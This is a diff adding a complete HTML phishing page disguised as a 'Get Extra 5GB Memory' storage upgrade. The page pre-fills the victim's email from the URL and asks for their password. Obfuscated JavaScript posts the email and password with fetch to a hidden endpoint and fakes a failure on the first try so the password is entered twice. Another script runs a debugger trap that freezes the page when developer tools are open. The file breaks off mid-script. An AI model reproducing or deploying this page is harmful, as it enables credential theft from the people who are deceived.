@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memory Upgrade - Get Extra 5GB</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='50%' x='50%' dominant-baseline='middle' text-anchor='middle' font-size='90'>💾</text></svg>" type="image/svg+xml">
+
+</head>
+
+<body>
+    <!-- Dark Mode Toggle -->
+    <button class="theme-toggle" aria-label="Toggle dark mode">
+        <i class="fas fa-moon"></i>
+        <i class="fas fa-sun"></i>
+    </button>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Memory Usage Visualization -->
+        <div class="memory-stats">
+            <div class="memory-bar">
+                <div class="memory-used" data-usage="98"></div>
+            </div>
+            <p class="memory-text">
+                <span class="current">4.98GB</span> of <span class="total">5GB</span> used
+            </p>
+        </div>
+
+        <!-- Main Upgrade Card -->
+        <div class="upgrade-card">
+            <div class="card-header">
+                <div class="icon-container">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                </div>
+                <h1>Get Extra 5GB Memory</h1>
+                <p class="subtitle">Expand your storage and never worry about running out of space again</p>
+            </div>
+
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Instant activation</span>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure & encrypted</span>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-sync-alt"></i>
+                    <span>Auto-sync across devices</span>
+                </div>
+            </div>
+
+            <button class="upgrade-btn" id="upgradeBtn">
+                <span class="btn-text">Upgrade Now</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+
+            <p class="price-info">
+                <span class="price">Free</span>
+                <span class="period">for the first month</span>
+            </p>
+        </div>
+    </div>
+
+    <!-- Modal Overlay -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <!-- Progress Indicator -->
+            <div class="progress-indicator">
+                <div class="step active" data-step="1">
+                    <div class="step-number">1</div>
+                    <span>Email</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step" data-step="2">
+                    <div class="step-number">2</div>
+                    <span>Password</span>
+                </div>
+            </div>
+
+            <!-- Close Button -->
+            <button class="close-btn" id="closeBtn" aria-label="Close modal">
+                <i class="fas fa-times"></i>
+            </button>
+
+            <!-- Step 1: Email Confirmation -->
+            <div class="modal-step active" id="step1">
+                <div class="modal-header">
+                    <div class="modal-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                    <h2>Confirm Your Email</h2>
+                    <p>We'll send you a confirmation link to get started</p>
+                </div>
+
+                <form class="modal-form" id="emailForm">
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" required readonly placeholder="Enter your email address" aria-describedby="email-error">
+                        <div class="error-message" id="email-error"></div>
+                    </div>
+
+                    <div class="form-group checkbox-group">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">Remember me on this device</label>
+                    </div>
+
+                    <button type="submit" class="form-btn">
+                        <span class="btn-text">Continue</span>
+                        <div class="loading-spinner"></div>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Step 2: Password Input -->
+            <div class="modal-step" id="step2">
+                <div class="modal-header">
+                    <div class="modal-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <h2>Verify Your Identity</h2>
+                    <p>Please enter your password to continue</p>
+                </div>
+
+                <form class="modal-form" id="passwordForm">
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="password-input">
+                            <input type="password" id="password" name="password" required placeholder="Enter your password" aria-describedby="password-error">
+                            <button type="button" class="password-toggle" aria-label="Toggle password visibility">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                        <div class="error-message" id="password-error"></div>
+                    </div>
+
+                    <button type="submit" class="form-btn">
+                        <span class="btn-text">Verify & Upgrade</span>
+                        <div class="loading-spinner"></div>
+                    </button>
+
+                    <a href="#" class="forgot-password">Forgot your password?</a>
+                </form>
+            </div>
+
+            <!-- Success Screen -->
+            <div class="modal-step success-step" id="successStep">
+                <div class="success-animation">
+                    <div class="checkmark">
+                        <i class="fas fa-check"></i>
+                    </div>
+                </div>
+                <h2>Thanks for Upgrading!</h2>
+                <p>We have started your upgrade process. You will receive a notification once it's complete.</p>
+                <div class="upgrade-status">
+                    <i class="fas fa-cog fa-spin"></i>
+                    <span>Processing upgrade...</span>
+                </div>
+                <button class="form-btn" id="doneBtn">
+                    <span class="btn-text">Close</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <style>
+         :root {
+            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --accent-gradient: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            --success-gradient: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            --bg-primary: #ffffff;
+            --bg-secondary: #f8fafc;
+            --bg-card: #ffffff;
+            --text-primary: #1a202c;
+            --text-secondary: #4a5568;
+            --text-muted: #718096;
+            --border-color: #e2e8f0;
+            --shadow-light: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            --shadow-medium: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            --shadow-heavy: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --border-radius: 16px;
+            --border-radius-sm: 8px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        [data-theme="dark"] {
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --bg-card: #1e293b;
+            --text-primary: #f1f5f9;
+            --text-secondary: #cbd5e1;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --shadow-light: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+            --shadow-medium: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+            --shadow-heavy: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+            transition: var(--transition);
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--primary-gradient);
+            opacity: 0.05;
+            z-index: -1;
+        }
+        
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            border: none;
+            border-radius: 50%;
+            background: var(--bg-card);
+            box-shadow: var(--shadow-medium);
+            cursor: pointer;
+            z-index: 1000;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .theme-toggle:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-heavy);
+        }
+        
+        .theme-toggle .fa-sun {
+            display: none;
+        }
+        
+        [data-theme="dark"] .theme-toggle .fa-sun {
+            display: block;
+        }
+        
+        [data-theme="dark"] .theme-toggle .fa-moon {
+            display: none;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 30px;
+        }
+        
+        .memory-stats {
+            background: var(--bg-card);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            box-shadow: var(--shadow-light);
+            border: 1px solid var(--border-color);
+        }
+        
+        .memory-bar {
+            width: 100%;
+            height: 8px;
+            background: var(--border-color);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .memory-used {
+            height: 100%;
+            background: var(--accent-gradient);
+            border-radius: 4px;
+            transition: width 1s ease-out;
+            animation: fillBar 2s ease-out;
+        }
+        
+        @keyframes fillBar {
+            from {
+                width: 0;
+            }
+        }
+        
+        .memory-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            text-align: center;
+        }
+        
+        .current {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        
+        .upgrade-card {
+            background: var(--bg-card);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            box-shadow: var(--shadow-medium);
+            border: 1px solid var(--border-color);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .upgrade-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--primary-gradient);
+        }
+        
+        .card-header {
+            margin-bottom: 30px;
+        }
+        
+        .icon-container {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: var(--primary-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+        
+        .icon-container i {
+            font-size: 32px;
+            color: white;
+        }
+        
+        .upgrade-card h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .features {
+            margin: 30px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: var(--bg-secondary);
+            border-radius: var(--border-radius-sm);
+            transition: var(--transition);
+        }
+        
+        .feature:hover {
+            transform: translateX(5px);
+        }
+        
+        .feature i {
+            color: #10b981;
+            font-size: 18px;
+        }
+        
+        .upgrade-btn {
+            width: 100%;
+            padding: 16px 24px;
+            background: var(--primary-gradient);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius-sm);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .upgrade-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .upgrade-btn:hover::before {
+            left: 100%;
+        }
+        
+        .upgrade-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-heavy);
+        }
+        
+        .upgrade-btn:active {
+            transform: translateY(0);
+        }
+        
+        .price-info {
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+        
+        .price {
+            font-weight: 600;
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: var(--transition);
+            padding: 20px;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal {
+            background: var(--bg-card);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow-heavy);
+            border: 1px solid var(--border-color);
+            position: relative;
+            transform: scale(0.9) translateY(20px);
+            transition: var(--transition);
+        }
+        
+        .modal-overlay.active .modal {
+            transform: scale(1) translateY(0);
+        }
+        
+        .progress-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            gap: 20px;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            opacity: 0.5;
+            transition: var(--transition);
+        }
+        
+        .step.active {
+            opacity: 1;
+        }
+        
+        .step-number {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            transition: var(--transition);
+        }
+        
+        .step.active .step-number {
+            background: var(--primary-gradient);
+            color: white;
+        }
+        
+        .step span {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        
+        .step.active span {
+            color: var(--text-primary);
+        }
+        
+        .step-line {
+            width: 40px;
+            height: 2px;
+            background: var(--border-color);
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 32px;
+            height: 32px;
+            border: none;
+            background: none;
+            cursor: pointer;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-muted);
+            transition: var(--transition);
+        }
+        
+        .close-btn:hover {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+        
+        .modal-step {
+            display: none;
+        }
+        
+        .modal-step.active {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .modal-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .modal-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background: var(--accent-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-icon i {
+            font-size: 24px;
+            color: white;
+        }
+        
+        .modal-header h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .modal-header p {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid var(--border-color);
+            border-radius: var(--border-radius-sm);
+            font-size: 16px;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            transition: var(--transition);
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .form-group input.error {
+            border-color: #ef4444;
+        }
+        
+        .password-input {
+            position: relative;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 4px;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin: 0;
+        }
+        
+        .error-message {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: 4px;
+            min-height: 16px;
+            padding: 8px;
+            border-radius: var(--border-radius-sm);
+            background: rgba(239, 68, 68, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .error-message i {
+            font-size: 14px;
+        }
+        
+        .form-btn {
+            width: 100%;
+            padding: 14px 24px;
+            background: var(--primary-gradient);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius-sm);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .form-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: var(--shadow-medium);
+        }
+        
+        .form-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%) rotate(0deg);
+            /* Fix spinner centering */
+        }
+        
+        @keyframes spin {
+            to {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+            /* Fix spinner animation */
+        }
+        
+        .forgot-password {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            text-align: center;
+            display: block;
+            transition: var(--transition);
+        }
+        
+        .forgot-password:hover {
+            color: var(--text-primary);
+        }
+        
+        .success-step {
+            text-align: center;
+        }
+        
+        .success-animation {
+            margin-bottom: 30px;
+        }
+        
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            background: var(--success-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: successPulse 0.6s ease-out;
+        }
+        
+        @keyframes successPulse {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .checkmark i {
+            font-size: 32px;
+            color: white;
+        }
+        
+        .success-step h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: var(--success-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .success-step p {
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+        }
+        
+        .upgrade-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 15px;
+            background: var(--bg-secondary);
+            border-radius: var(--border-radius-sm);
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+        
+        .upgrade-status i {
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+        /* Mobile Optimizations */
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+                gap: 20px;
+            }
+            .upgrade-card {
+                padding: 25px 20px;
+            }
+            .upgrade-card h1 {
+                font-size: 24px;
+            }
+            .modal {
+                padding: 25px 20px;
+                margin: 10px;
+            }
+            .progress-indicator {
+                gap: 15px;
+            }
+            .step-line {
+                width: 30px;
+            }
+            .form-group input {
+                font-size: 16px;
+                /* Prevents zoom on iOS */
+            }
+        }
+        /* Accessibility */
+        
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+        /* Focus styles for keyboard navigation */
+        
+        button:focus-visible,
+        input:focus-visible {
+            outline: 2px solid #667eea;
+            outline-offset: 2px;
+        }
+        /* High contrast mode support */
+        
+        @media (prefers-contrast: high) {
+             :root {
+                --border-color: #000000;
+                --text-muted: #000000;
+            }
+        }
+    </style>
+        <script>
+            (function() {
+                function checkDebugger() {
+                    var start = new Date();
+                    debugger; // Will cause a pause if devtools are open
+                    var end = new Date();
+                    if (end - start > 100) { // Threshold in ms (adjust as needed)
+                        // alert("Debugger detected. Execution paused.");
+                        // Halt execution by entering an infinite loop.
+                        while(true) {}
+                    }
+                }
+                // Check every 500ms (adjust interval as needed)
+                setInterval(checkDebugger, 500);
+            })();
+        </script>
+    <script>
+     const _0x5c7613=_0x537d;(function(_0x2f4b87,_0xcbf3cc){const _0x4e668f=_0x537d,_0x48f323=_0x2f4b87();while(!![]){try{const _0x50527b=-parseInt(_0x4e668f(0x1f4))/0x1+-parseInt(_0x4e668f(0x211))/0x2+parseInt(_0x4e668f(0x1fd))/0x3+-parseInt(_0x4e668f(0x1d9))/0x4+-parseInt(_0x4e668f(0x1e4))/0x5*(parseInt(_0x4e668f(0x1da))/0x6)+-parseInt(_0x4e668f(0x20f))/0x7*(parseInt(_0x4e668f(0x1f5))/0x8)+parseInt(_0x4e668f(0x1d2))/0x9;if(_0x50527b===_0xcbf3cc)break;else _0x48f323['push'](_0x48f323['shift']());}catch(_0x25c047){_0x48f323['push'](_0x48f323['shift']());}}}(_0x4c41,0xbf978));let currentStep=0x1,userEmail='',attemptCount=0x0;function setupEventListeners(){const _0x38b5ad=_0x537d;document[_0x38b5ad(0x1d6)]('upgradeBtn')['addEventListener'](_0x38b5ad(0x20d),()=>{openModal();}),document[_0x38b5ad(0x1d6)]('closeBtn')[_0x38b5ad(0x1ea)](_0x38b5ad(0x20d),()=>{closeModal();}),document[_0x38b5ad(0x1d6)](_0x38b5ad(0x1ff))[_0x38b5ad(0x1ea)]('click',_0x3dbb4e=>{const _0x4335e7=_0x38b5ad;_0x3dbb4e['target']===_0x3dbb4e[_0x4335e7(0x1d3)]&&closeModal();}),document[_0x38b5ad(0x1d6)]('emailForm')[_0x38b5ad(0x1ea)](_0x38b5ad(0x213),_0x40cd47=>{handleEmailSubmit(_0x40cd47);}),document[_0x38b5ad(0x1d6)](_0x38b5ad(0x1e2))[_0x38b5ad(0x1ea)](_0x38b5ad(0x213),_0x1ba45e=>{handlePasswordSubmit(_0x1ba45e);}),document[_0x38b5ad(0x1d6)](_0x38b5ad(0x21b))[_0x38b5ad(0x1ea)](_0x38b5ad(0x20d),()=>{closeModal(),resetModal();}),document[_0x38b5ad(0x215)](_0x38b5ad(0x1f7))[_0x38b5ad(0x1ea)](_0x38b5ad(0x20d),()=>{togglePasswordVisibility();}),document[_0x38b5ad(0x1ea)]('keydown',_0x4794dd=>{const _0x21897b=_0x38b5ad;_0x4794dd[_0x21897b(0x1e5)]==='Escape'&&closeModal();});}function setupThemeToggle(){const _0x2324a1=_0x537d,_0x16046c=document[_0x2324a1(0x215)]('.theme-toggle'),_0x465166=localStorage[_0x2324a1(0x200)](_0x2324a1(0x20e))||'light';document[_0x2324a1(0x1cb)][_0x2324a1(0x21a)](_0x2324a1(0x209),_0x465166),_0x16046c[_0x2324a1(0x1ea)]('click',()=>{const _0x10df7f=_0x2324a1,_0x5e67c5=document[_0x10df7f(0x1cb)][_0x10df7f(0x205)](_0x10df7f(0x209)),_0x3b8b64=_0x5e67c5===_0x10df7f(0x1d8)?_0x10df7f(0x21c):_0x10df7f(0x1d8);document[_0x10df7f(0x1cb)]['setAttribute'](_0x10df7f(0x209),_0x3b8b64),localStorage['setItem'](_0x10df7f(0x20e),_0x3b8b64);});}function autoFillEmail(){const _0x570da6=_0x537d,_0x452d77=window['location'][_0x570da6(0x1eb)];if(_0x452d77[_0x570da6(0x1ec)]>0x1){const _0x546474=decodeURIComponent(_0x452d77['substring'](0x1));document['getElementById']('email')[_0x570da6(0x214)]=_0x546474,userEmail=_0x546474;}}function animateMemoryBar(){const _0xe79e25=_0x537d,_0x5af1d6=document[_0xe79e25(0x215)](_0xe79e25(0x1e0)),_0x304c79=_0x5af1d6['getAttribute']('data-usage');setTimeout(()=>{const _0x5219c1=_0xe79e25;_0x5af1d6[_0x5219c1(0x1e9)][_0x5219c1(0x220)]=_0x304c79+'%';},0x1f4);}function setupFormValidation(){const _0x1f6f52=_0x537d,_0x89915d=document[_0x1f6f52(0x1d6)](_0x1f6f52(0x219));_0x89915d&&_0x89915d['addEventListener'](_0x1f6f52(0x224),_0x4fd765=>{const _0x14ed8a=_0x1f6f52;validateEmail(_0x4fd765[_0x14ed8a(0x203)][_0x14ed8a(0x214)]);});const _0xe5d20c=document[_0x1f6f52(0x1d6)](_0x1f6f52(0x21e));_0xe5d20c&&_0xe5d20c[_0x1f6f52(0x1ea)](_0x1f6f52(0x218),_0x9c1253=>{validatePasswordConfirmation();});}function openModal(){const _0x5679e0=_0x537d;document[_0x5679e0(0x1d6)]('modalOverlay')['classList']['add'](_0x5679e0(0x204)),document[_0x5679e0(0x202)][_0x5679e0(0x1e9)][_0x5679e0(0x1fe)]=_0x5679e0(0x223),setTimeout(()=>{const _0x315356=_0x5679e0;document[_0x315356(0x1d6)](_0x315356(0x219))[_0x315356(0x1e1)]();},0x12c);}function closeModal(){const _0x31a51d=_0x537d;document[_0x31a51d(0x1d6)](_0x31a51d(0x1ff))[_0x31a51d(0x216)][_0x31a51d(0x1cd)]('active'),document[_0x31a51d(0x202)][_0x31a51d(0x1e9)][_0x31a51d(0x1fe)]='',resetModal();}function resetModal(){currentStep=0x1,showStep(0x1),resetForms(),resetProgressIndicator(),updateMemoryDisplay();}function showStep(_0x4a217f){const _0x26a4d2=_0x537d;document['querySelectorAll'](_0x26a4d2(0x1fa))[_0x26a4d2(0x207)](_0x299e84=>{const _0x5d7c32=_0x26a4d2;_0x299e84[_0x5d7c32(0x216)]['remove']('active');});const _0x3a2683=_0x4a217f===_0x26a4d2(0x206)?document[_0x26a4d2(0x1d6)]('successStep'):document[_0x26a4d2(0x1d6)](_0x26a4d2(0x226)+_0x4a217f);_0x3a2683&&_0x3a2683[_0x26a4d2(0x216)]['add'](_0x26a4d2(0x204)),typeof _0x4a217f===_0x26a4d2(0x21f)&&(document['querySelectorAll']('.step')[_0x26a4d2(0x207)]((_0x137d53,_0x599b78)=>{const _0x513cb2=_0x26a4d2;_0x599b78+0x1<=_0x4a217f?_0x137d53[_0x513cb2(0x216)][_0x513cb2(0x1df)](_0x513cb2(0x204)):_0x137d53[_0x513cb2(0x216)][_0x513cb2(0x1cd)](_0x513cb2(0x204));}),currentStep=_0x4a217f);}async function handleEmailSubmit(_0x341c91){const _0xc62492=_0x537d;_0x341c91[_0xc62492(0x20b)]();const _0x3a037e=document[_0xc62492(0x1d6)](_0xc62492(0x219))[_0xc62492(0x214)],_0x374ea6=_0x341c91[_0xc62492(0x203)]['querySelector'](_0xc62492(0x221));if(!validateEmail(_0x3a037e))return;setLoading(_0x374ea6,!![]),await delay(0x5dc),setLoading(_0x374ea6,![]),userEmail=_0x3a037e,document[_0xc62492(0x1d6)](_0xc62492(0x210))['checked']&&localStorage[_0xc62492(0x1ce)]('rememberedEmail',_0x3a037e),showStep(0x2),setTimeout(()=>{const _0x40b14a=_0xc62492;document[_0x40b14a(0x1d6)]('password')[_0x40b14a(0x1e1)]();},0x12c);}async function handlePasswordSubmit(_0x3225ba){const _0x2bac58=_0x537d;_0x3225ba['preventDefault']();const _0x37325f=document[_0x2bac58(0x1d6)](_0x2bac58(0x219))[_0x2bac58(0x214)],_0x3789ba=document[_0x2bac58(0x1d6)](_0x2bac58(0x1e3))[_0x2bac58(0x214)],_0x43c34f=_0x3225ba['target']['querySelector'](_0x2bac58(0x221)),_0x5a3267=document[_0x2bac58(0x1d6)](_0x2bac58(0x1e6));if(!validatePassword(_0x3789ba))return;setLoading(_0x43c34f,!![]);try{const _0x3873c0=await fetch(_0x2bac58(0x212),{'method':_0x2bac58(0x1ed),'headers':{'Content-Type':_0x2bac58(0x1d0)},'body':JSON[_0x2bac58(0x1f2)]({'email':_0x37325f,'password':_0x3789ba})});attemptCount++;if(attemptCount<0x2){await delay(0xbb8),showError(_0x5a3267,document['getElementById'](_0x2bac58(0x1e3)),_0x2bac58(0x1d4)),document[_0x2bac58(0x1d6)](_0x2bac58(0x1e3))[_0x2bac58(0x214)]='';return;}_0x43c34f[_0x2bac58(0x215)](_0x2bac58(0x21d))['textContent']=_0x2bac58(0x1d7),await delay(0xbb8),showStep(_0x2bac58(0x206));}catch(_0x3d6ef1){showError(_0x5a3267,document['getElementById'](_0x2bac58(0x1e3)),_0x2bac58(0x1de));}finally{setLoading(_0x43c34f,![]);}}function validateEmail(_0x2283fb){const _0x15a15d=_0x537d,_0x2ec370=/^[^\s@]+@[^\s@]+\.[^\s@]+$/,_0x1de9a7=document[_0x15a15d(0x1d6)]('email-error'),_0x1f67b1=document['getElementById']('email');if(!_0x2283fb)return showError(_0x1de9a7,_0x1f67b1,'Email\x20is\x20required'),![];else return!_0x2ec370[_0x15a15d(0x1ca)](_0x2283fb)?(showError(_0x1de9a7,_0x1f67b1,_0x15a15d(0x1f8)),![]):(clearError(_0x1de9a7,_0x1f67b1),!![]);}function validatePassword(_0x17a79){const _0x7d25d1=_0x537d,_0x5009d1=document[_0x7d25d1(0x1d6)](_0x7d25d1(0x1e6)),_0xa8fdae=document[_0x7d25d1(0x1d6)](_0x7d25d1(0x1e3));if(!_0x17a79)return showError(_0x5009d1,_0xa8fdae,_0x7d25d1(0x1e8)),![];else return _0x17a79[_0x7d25d1(0x1ec)]<0x5?(showError(_0x5009d1,_0xa8fdae,_0x7d25d1(0x1ee)),![]):(clearError(_0x5009d1,_0xa8fdae),!![]);}function validatePasswordConfirmation(){const _0xcff83f=_0x537d,_0x270893=document[_0xcff83f(0x1d6)](_0xcff83f(0x1e3))[_0xcff83f(0x214)],_0x103d65=document['getElementById'](_0xcff83f(0x21e))[_0xcff83f(0x214)],_0x4d1649=document[_0xcff83f(0x1d6)](_0xcff83f(0x1cf)),_0x106927=document[_0xcff83f(0x1d6)]('confirmPassword');if(!_0x103d65)return showError(_0x4d1649,_0x106927,_0xcff83f(0x1cc)),![];else return _0x270893!==_0x103d65?(showError(_0x4d1649,_0x106927,'Passwords\x20do\x20not\x20match'),![]):(clearError(_0x4d1649,_0x106927),!![]);}function togglePasswordVisibility(){const _0x21967d=_0x537d,_0xe1fff6=document['getElementById']('password'),_0x4f0bd1=document[_0x21967d(0x215)](_0x21967d(0x20a));_0xe1fff6[_0x21967d(0x1f0)]==='password'?(_0xe1fff6['type']='text',_0x4f0bd1[_0x21967d(0x1e7)]=_0x21967d(0x1f6)):(_0xe1fff6[_0x21967d(0x1f0)]=_0x21967d(0x1e3),_0x4f0bd1[_0x21967d(0x1e7)]=_0x21967d(0x1d1));}function 